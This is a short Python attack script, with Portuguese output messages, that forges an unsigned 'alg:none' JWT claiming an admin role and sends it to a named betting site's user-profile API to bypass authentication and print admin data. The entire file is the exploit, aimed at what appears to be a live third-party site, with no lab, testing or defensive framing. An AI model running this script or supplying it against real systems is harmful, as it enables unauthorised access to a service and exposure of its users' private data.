import requests
import json
import base64

def exploit_jwt():
    url = "https://w1-panda.bet/api/user/profile"
    print("[*] Tentando bypass de autenticação via JWT manipulado...")
    
    # Criar um token JWT falso com admin=true
    header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().replace("=", "")
    payload = base64.b64encode(json.dumps({"user": "admin", "role": "admin", "admin": True}).encode()).decode().replace("=", "")
    fake_token = f"{header}.{payload}."
    
    headers = {"Authorization": f"Bearer {fake_token}"}
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[!!!] SUCESSO: Bypass de JWT (alg:none) funcionou!")
            print(f"Dados do Perfil Admin: {response.text}")
            return True
    except:
        pass
        
    print("[-] Bypass de JWT não funcionou.")
    return False

if __name__ == "__main__":
    exploit_jwt()
